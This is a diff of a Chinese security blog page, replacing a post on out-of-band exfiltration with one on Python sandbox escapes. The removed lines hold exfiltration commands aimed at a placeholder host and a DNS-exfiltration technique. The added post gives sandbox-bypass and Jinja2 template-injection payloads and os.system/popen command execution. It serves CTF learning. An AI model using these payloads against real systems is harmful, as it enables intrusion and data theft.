@@ -92,17 +92,17 @@
 
 
 
-<meta name="description" content="在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用">
+<meta name="description" content="对python沙盒的编写以及现有几种常见的沙盒绕过策略的一点总结">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Out Of Band 带外攻击的一点总结">
-<meta property="og:url" content="https://someonesometimes.github.io/2017/11/14/Out-Of-Band-带外攻击的一点总结/index.html">
+<meta property="og:title" content="python沙盒的几种绕过方式">
+<meta property="og:url" content="https://someonesometimes.github.io/2017/11/16/python沙盒绕过/index.html">
 <meta property="og:site_name" content="Yiruma">
-<meta property="og:description" content="在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用">
-<meta property="og:updated_time" content="2017-11-15T10:42:10.708Z">
+<meta property="og:description" content="对python沙盒的编写以及现有几种常见的沙盒绕过策略的一点总结">
+<meta property="og:updated_time" content="2017-11-16T10:35:49.118Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Out Of Band 带外攻击的一点总结">
-<meta name="twitter:description" content="在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用">
+<meta name="twitter:title" content="python沙盒的几种绕过方式">
+<meta name="twitter:description" content="对python沙盒的编写以及现有几种常见的沙盒绕过策略的一点总结">
 
 
 
@@ -130,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="https://someonesometimes.github.io/2017/11/14/Out-Of-Band-带外攻击的一点总结/"/>
+  <link rel="canonical" href="https://someonesometimes.github.io/2017/11/16/python沙盒绕过/"/>
 
 
 
 
 
-  <title>Out Of Band 带外攻击的一点总结 | Yiruma</title>
+  <title>python沙盒的几种绕过方式 | Yiruma</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -294,7 +294,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="https://someonesometimes.github.io/2017/11/14/Out-Of-Band-带外攻击的一点总结/">
+    <link itemprop="mainEntityOfPage" href="https://someonesometimes.github.io/2017/11/16/python沙盒绕过/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yiruma">
@@ -311,7 +311,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Out Of Band 带外攻击的一点总结</h1>
+          <h1 class="post-title" itemprop="name headline">python沙盒的几种绕过方式</h1>
         
 
         <div class="post-meta">
@@ -323,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-14T22:51:05+08:00">
-                2017-11-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-16T11:05:18+08:00">
+                2017-11-16
               </time>
             
 
@@ -363,35 +363,72 @@
       
 
       
-        <p>在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用</p>
+        <p>对python沙盒的编写以及现有几种常见的沙盒绕过策略的一点总结</p>
 <a id="more"></a>
-<h2 id="什么是带外攻击，应用场景有哪些？"><a href="#什么是带外攻击，应用场景有哪些？" class="headerlink" title="什么是带外攻击，应用场景有哪些？"></a>什么是带外攻击，应用场景有哪些？</h2><p>在很多攻击中，可能我们无法直接看到攻击的回显，也许攻击行为的确产生了，但数据并不一定能够回显到攻击者的眼中，这时候我们可以借助网络请求，将回显结果发送到我们的服务器上，就可以看到回显了，这种方式就叫做带外攻击</p>
-<p>比较常见的使用场景有这些，如果我们无法直接看到攻击的回显，就可以考虑使用带外攻击来通过网络请求拿到回显数据</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="内建名称空间-builtins"><a href="#内建名称空间-builtins" class="headerlink" title="内建名称空间 __builtins__"></a>内建名称空间 <code>__builtins__</code></h3><p>在启动Python解释器之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，这些函数就是内建函数，并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始</p>
+<p>名称空间在python是个非常重要的概念，只得是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间</p>
 <ul>
-<li>命令执行</li>
-<li>sql注入</li>
-<li>XXE</li>
+<li>内建名称空间</li>
+<li>全局名称空间</li>
 </ul>
-<h2 id="介绍几个常用的接收回显的网站"><a href="#介绍几个常用的接收回显的网站" class="headerlink" title="介绍几个常用的接收回显的网站"></a>介绍几个常用的接收回显的网站</h2><ul>
-<li><p>火日师傅在github上开源的<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">xss平台</a></p>
-<p>好处是搭在自己的vps上面，修改使用起来都十分方便，而且记录的参数十分详细，cookie，post，get的数据都能拿到，问题是没法获得基于dns方式的数据，而且链接限制在了<a href="http://ip/xss/这样，url形式不能修改，只能改变传输的参数" target="_blank" rel="external">http://ip/xss/这样，url形式不能修改，只能改变传输的参数</a></p>
+<p>这里我们主要关注的是内建名称空间，是名字到内建对象的映射，，在python中，初始的<code>__builtins__</code>模块提供内建名称空间到内建对象的映射</p>
+<p>dir()函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</div><div class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</div><div class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'base64'</span>, <span class="string">'os'</span>]</div></pre></td></tr></table></figure>
+<p>这里面，我们可以看到<code>__builtins__</code>是做为默认初始模块出现的，那么用dir()命令看看<code>__builtins__</code>的成分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</div><div class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StandardError'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'WindowsError'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'_'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'apply'</span>, <span class="string">'basestring'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'buffer'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'cmp'</span>, <span class="string">'coerce'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'exit'</span>, <span class="string">'file'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'intern'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'long'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'raw_input'</span>, <span class="string">'reduce'</span>, <span class="string">'reload'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'unichr'</span>, <span class="string">'unicode'</span>, <span class="string">'vars'</span>, <span class="string">'xrange'</span>, <span class="string">'zip'</span>]</div></pre></td></tr></table></figure>
+<p>从里面我们可以看到一些我们经常用到的函数：open(),eval(),len(),<code>__import__</code>,以及我们刚才用的dir()函数，还有我们要用的一些对象诸如list,dict,tuple,int,float这些，然后还有一些异常啥的。当然，这里面最关键的就是<code>__import__</code>了，可以使用import函数的话，就可以导入任意模块了。</p>
+<p>因为后面的绕过，所以这里要先提一下，python中每个对象都会提供dict属性，用于对象属性值到属性的映射，我们通过dir()可以看到一个对象的所有属性，然后可以通过<code>__builtins__.open</code>去调用它，其实同时我们也可以通过对象中带有的—<code>__dict__</code>通过属性名映射访问到对应的属性，既然是通过字符串访问属性，所以这里属性名是可以很容易逃过字符匹配的的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.open</div><div class="line">&lt;built-<span class="keyword">in</span> function open&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'op'</span>+<span class="string">'en'</span>]</div><div class="line">&lt;built-<span class="keyword">in</span> function open&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'b3Blbg=='</span>.decode(<span class="string">'base64'</span>)]</div><div class="line">&lt;built-<span class="keyword">in</span> function open&gt;</div></pre></td></tr></table></figure>
+<h3 id="python中的类继承以及全局变量方法"><a href="#python中的类继承以及全局变量方法" class="headerlink" title="python中的类继承以及全局变量方法"></a>python中的类继承以及全局变量方法</h3><p>在网上没有找到太多的解释，可能有些地方理解是错的，还请师傅们指出orz。用起来是没问题的。</p>
+<p>python中对一个变量采用<code>__class__</code>从变量转到对应的对象后，有这些类继承的方法</p>
+<ul>
+<li><code>__base__</code>  对象的一个基类，大多数结果都为<code>&lt;type &#39;object&#39;&gt;</code></li>
+<li><code>__subclasses__()</code>  对象的子类，为一个列表</li>
+<li><code>&lt;class &#39;xxx&#39;&gt;.__init__.__globals__</code>  返回一个类的全局变量，为字典形式，这里面常常包含我们想要的模块或者函数</li>
+</ul>
+<p>了解这些是有些用处的，我们的可以从变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量  这个流程中，找到我们想要的模块或者函数</p>
+<h2 id="从沙盒编写中看沙盒逃逸思路"><a href="#从沙盒编写中看沙盒逃逸思路" class="headerlink" title="从沙盒编写中看沙盒逃逸思路"></a>从沙盒编写中看沙盒逃逸思路</h2><h3 id="通过删除内建空间中的成员来限制"><a href="#通过删除内建空间中的成员来限制" class="headerlink" title="通过删除内建空间中的成员来限制"></a>通过删除内建空间中的成员来限制</h3><p>比较典型的删除名单列表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></div><div class="line">    UNSAFE = [<span class="string">'open'</span>,</div><div class="line">              <span class="string">'file'</span>,</div><div class="line">              <span class="string">'execfile'</span>,</div><div class="line">              <span class="string">'compile'</span>,</div><div class="line">              <span class="string">'reload'</span>,</div><div class="line">              <span class="string">'__import__'</span>,</div><div class="line">              <span class="string">'eval'</span>,</div><div class="line">              <span class="string">'input'</span>]</div><div class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</div><div class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</div></pre></td></tr></table></figure>
+<p><code>__import__</code>被删掉了，限制了对敏感模块的导入</p>
+<p><code>reload</code>被删掉了，限制了对已有模块的重新导入，<code>reload(__builtins__)</code></p>
+<p><code>open</code>被删掉了，限制文件读写</p>
+<p><code>eval</code>被删掉了，限制字符代码执行</p>
+<p>如果没有限制reload的话，就可以将<code>__builtins__</code>重新导入，但是在这种经典配置下，似乎我们目前只有下面这一种姿势去搞：</p>
+<p>其实思路之前已经介绍过了，就是变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量 ，在这个流程中找到我们想要的模块或者函数。介绍一个简易的寻找代码</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">def findModule(srcmodule, dstmodule):</div><div class="line">    i = 0</div><div class="line">    results = srcmodule.__class__.__base__.__subclasses__()</div><div class="line">    for item in results:</div><div class="line">        i += 1</div><div class="line">        if '&lt;class' in str(item):</div><div class="line">            try:</div><div class="line">                modules = item.__init__.__globals__.keys()</div><div class="line">                for module in modules:</div><div class="line">                    j += 1</div><div class="line">                    # print module</div><div class="line">                    if dstmodule == module:</div><div class="line">                        print(item,i-1,str(srcmodule)+".__class__.__base__.__subclasses__()["+str(i-1)+"].__init__.__globals__['" + str(dstmodule) + "']")</div><div class="line">                        break</div><div class="line">            except:</div><div class="line">                pass</div><div class="line">              </div><div class="line">运行：</div><div class="line">findModule([],'os')</div><div class="line">输出：</div><div class="line">(&lt;class 'site._Printer'&gt;, 72, "[].__class__.__base__.__subclasses__()[72].__init__.__globals__['os']")</div><div class="line">(&lt;class 'site.Quitter'&gt;, 77, "[].__class__.__base__.__subclasses__()[77].__init__.__globals__['os']")</div></pre></td></tr></table></figure>
+<h3 id="通过对参数的匹配来进行过滤"><a href="#通过对参数的匹配来进行过滤" class="headerlink" title="通过对参数的匹配来进行过滤"></a>通过对参数的匹配来进行过滤</h3><p>通过字符匹配去做过滤，python写法那么多，我们采用不同的写法就好了，所以应对这种姿势的方法也是多种多样</p>
+<ol>
+<li><p>一般都会限制os，import</p>
+<p>可以考虑以下几个思路，<code>__builtins__</code>里面包含着import方法，借助之前提到的<code>__dict__</code>属性可以通过字符串编码绕过</p>
+<p><code>__builtins__.__dict__[&#39;__impo&#39;+&#39;rt__&#39;](&#39;o&#39;+&#39;s&#39;)</code>，这里不仅属性是字符串来表示的了，因为这时候import作为一个函数，所以要导入的模块也是一个字符串，我们可以进行拼接，编码等操作</p>
 </li>
-<li><p><a href="http://ceye.io" target="_blank" rel="external">ceye平台</a></p>
-<p>应该是知道创宇的平台，为每个用户分配一个识别url，方便的地方是除了支持http链接接收，还可以通过dns方式接收回显，并且链接的形式比较随意，域名啊，后面的路径啊都随意，只要域名是基于为自己分配的指定url就可以。不太方便的地方就是貌似对http方式发送回显的接收结果中是看不到太详细的数据的。</p>
+<li><p>限制<code>__ [] &#39;等各种字符</code> </p>
+<p>本来我以为也能利用<code>__dict__</code>的方法，将payload中的属性转变为字符串来表示的，但一来<code>__dict__</code>自身就带有<code>__</code>，二来<code>__globals__ __subclasses__  __base__</code>这些并不是属性，无法使用<code>__dict__</code>，所以非模板注入的情况下，暂时没有找到绕过的方法</p>
+<p>但是在Jinja2模板注入中，绕过是可行的：</p>
+<ul>
+<li><p>可以用<code>[].__class__[&#39;__base__&#39;]</code>来表示<code>[].__class__.__base__</code>，为了免去从变量到对象这一步则使用flask中的request对象，也就是<code>request[&#39;_&#39;+&#39;_base_&#39;+&#39;_&#39;]</code></p>
+</li>
+<li><p>如果不允许用[]，jinja2中的函数|attr()也可以代表属性，更推荐用这种</p>
+<p><code>[]|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)</code></p>
+</li>
+<li><p>如果禁止使用引号，可以考虑使用request.args.para1参数来代表</p>
+<p><code>url?mobancanshu=[]|attr(request.args.para1)&amp;para1=__class__</code></p>
+<p>当然，如果<code>__</code>的检测是对全部传入参数的，还可以使用Jinja2中自带的链接函数<code>(&#39;a&#39;,&#39;b&#39;)|join</code>，所以最后的payload就是这样</p>
+<p><code>mobancanshu=[]|attr((request.args.para1*2, request.args.para2, request.args.para1*2)|join)|attr((request.args.para1*2, request.args.para3, request.args.para1*2)|join)&amp;para1=_&amp;para2=class&amp;para3=base</code></p>
+<p>再加一句，如果<code>|join</code>被过滤，其实还有个替代函数<code>mobancanshu=(request.args.para1)|format(request.args.pata2, request.args.pata2, request.args.pata2, request.args.pata2)&amp;para1=%s%sbase%s%s&amp;para2=_</code></p>
+</li>
+<li><p>在hctf中又看到了一些绕过的姿势</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">过滤了：	</div><div class="line">空格(%20)，回车(%0a)，&apos;__&apos;,&apos;[&apos;,&apos;]&apos;,&apos;os&apos;,&apos;&quot;&apos;,&quot;|[a-z]&quot;</div><div class="line">绕过方法：</div><div class="line">空格可以用tab(%09)绕过，|后不允许接a-z可以用%0c即|%0cattr，tab等绕过</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<h2 id="带外攻击中两种回显信息发送方式"><a href="#带外攻击中两种回显信息发送方式" class="headerlink" title="带外攻击中两种回显信息发送方式"></a>带外攻击中两种回显信息发送方式</h2><h3 id="很常见的通过http方式发送，回显信息可以放在以下几个位置："><a href="#很常见的通过http方式发送，回显信息可以放在以下几个位置：" class="headerlink" title="很常见的通过http方式发送，回显信息可以放在以下几个位置："></a>很常见的通过http方式发送，回显信息可以放在以下几个位置：</h3><ul>
-<li><a href="http://myip/id=xxxxx" target="_blank" rel="external">http://myip/id=xxxxx</a> get参数部分</li>
-<li>curl –cookie id=xxxx <a href="http://myip" target="_blank" rel="external">http://myip</a>   放在cookie里</li>
-<li>curl –data id=xxxx <a href="http://myip" target="_blank" rel="external">http://myip</a>    放在post参数</li>
-<li><a href="http://myip/xxxx" target="_blank" rel="external">http://myip/xxxx</a> 放在路径里</li>
-</ul>
-<p>有一点要提醒的是，测试中看到，发送数据有换行的话，或多或少的都会有问题，因为建议将数据进行编码后再传输，比如在命令注入中可以使用<code>cat /etc/passwd | base64</code>来将回显结果进行编码</p>
-<h3 id="通过DNS解析方式来获得回显"><a href="#通过DNS解析方式来获得回显" class="headerlink" title="通过DNS解析方式来获得回显"></a>通过DNS解析方式来获得回显</h3><p>这也是在HCTF中才知道的姿势（哎，感觉自己孤陋寡闻，真的好菜。。。）。大致原理是这样的，还是发送一个链接，我们将回显信息放到域名里去，大致就是<a href="http://xxxx.myip/这种形式，服务器对于这种链接会首先进行DNS解析来拿到对应域名的IP才能发送IP报文，而这种DNS报我们是可以拿到的，就是通过上面介绍到的ceye平台，可以查询DNS报，也就是某个域名的解析记录，这样我们就可以拿到了回显的数据" target="_blank" rel="external">http://xxxx.myip/这种形式，服务器对于这种链接会首先进行DNS解析来拿到对应域名的IP才能发送IP报文，而这种DNS报我们是可以拿到的，就是通过上面介绍到的ceye平台，可以查询DNS报，也就是某个域名的解析记录，这样我们就可以拿到了回显的数据</a></p>
-<p>但是DNS回显是有限制的，因为回显字符作为域名的一部分，就要遵守域名的规则，根据规定，只能使用英文字符，数字，-，且-不能用作开头和结尾，域名长度也限制在了63，这样看来，DNS携带比较适用于携带hash后密码这些数据</p>
-<p>讲道理这种方式很明显没有直接通过http发送数据来的方便，但的确在某些时候只能用这种方式来对外发送请求将数据传输出来，通过对HCTF中那道sql题目的测试，可以发现loadfile(‘\\\\vips\x\‘?id=123)在平台上是接收不到请求的，从sql执行结果上看执行时间是0s，看来没有发送网络请求，只有我们换一个域名，在不同域名的时候，sql执行结果才会显示花费了一定的时间，看来是用来进行DNS查询了，在这种sql的带外攻击中，loadfile函数只能配合DNS方式的回显才能做到</p>
-<h2 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h2><p>可以直接参见ceye的网站，里面有各种攻击场景下的payload，还是很全的</p>
-<p><a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>
+</li>
+<li><p>接着上面提到的非模板注入下场景如果过滤了<code>__</code>暂时没有绕过方法这个话题，08067的比赛中有个有趣的场景</p>
+<p>一个在线代码练习的网站，首先肯定不能禁用掉import，否则用户体验极差。。所以主要的过滤在基于字符的上面，过滤掉了<code>__</code>等字符，此时没必要执着在那个长长的魔术方法流程上了，用不了啦，<code>__builtins__</code>所提供的思路也用不了啦，既然是字符过滤，那么就考虑怎样使用字符形式的调用方法来绕过字符检测就好了。最开始自然想到eval，但是被删掉了。</p>
+<p>解决方案是在import上下手，python中有很多内置模块可以import进去，我们可以在里面找到一些和eval类似的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 用于测试代码的运行时间</span></div><div class="line"><span class="keyword">import</span> timeit</div><div class="line">timeit.timeit(<span class="string">"__import__('os').system('ls')"</span>, number=<span class="number">1</span>)</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 一般用于显示各种配置信息</span></div><div class="line"><span class="keyword">import</span> platform</div><div class="line">platform.popen(<span class="string">'ls'</span>, mode=<span class="string">'r'</span>).read()</div></pre></td></tr></table></figure>
+</li>
+</ol>
 
       
     </div>
@@ -428,8 +465,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/16/python沙盒绕过/" rel="next" title="python沙盒的几种绕过方式">
-                <i class="fa fa-chevron-left"></i> python沙盒的几种绕过方式
+              <a href="/2017/11/16/XXE注入攻击/" rel="next" title="XXE注入攻击">
+                <i class="fa fa-chevron-left"></i> XXE注入攻击
               </a>
             
           </div>
@@ -438,8 +475,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/10/23/Java阻塞队列学习及LinkedBlockingQueue源码分析/" rel="prev" title="Java阻塞队列学习及LinkedBlockingQueue源码分析">
-                Java阻塞队列学习及LinkedBlockingQueue源码分析 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/11/14/Out-Of-Band-带外攻击的一点总结/" rel="prev" title="Out Of Band 带外攻击的一点总结">
+                Out Of Band 带外攻击的一点总结 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -560,7 +597,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是带外攻击，应用场景有哪些？"><span class="nav-number">1.</span> <span class="nav-text">什么是带外攻击，应用场景有哪些？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#介绍几个常用的接收回显的网站"><span class="nav-number">2.</span> <span class="nav-text">介绍几个常用的接收回显的网站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#带外攻击中两种回显信息发送方式"><span class="nav-number">3.</span> <span class="nav-text">带外攻击中两种回显信息发送方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#很常见的通过http方式发送，回显信息可以放在以下几个位置："><span class="nav-number">3.1.</span> <span class="nav-text">很常见的通过http方式发送，回显信息可以放在以下几个位置：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过DNS解析方式来获得回显"><span class="nav-number">3.2.</span> <span class="nav-text">通过DNS解析方式来获得回显</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些payload"><span class="nav-number">4.</span> <span class="nav-text">一些payload</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内建名称空间-builtins"><span class="nav-number">1.1.</span> <span class="nav-text">内建名称空间 __builtins__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python中的类继承以及全局变量方法"><span class="nav-number">1.2.</span> <span class="nav-text">python中的类继承以及全局变量方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#从沙盒编写中看沙盒逃逸思路"><span class="nav-number">2.</span> <span class="nav-text">从沙盒编写中看沙盒逃逸思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通过删除内建空间中的成员来限制"><span class="nav-number">2.1.</span> <span class="nav-text">通过删除内建空间中的成员来限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过对参数的匹配来进行过滤"><span class="nav-number">2.2.</span> <span class="nav-text">通过对参数的匹配来进行过滤</span></a></li></ol></li></ol></div>
             
 
           </div>
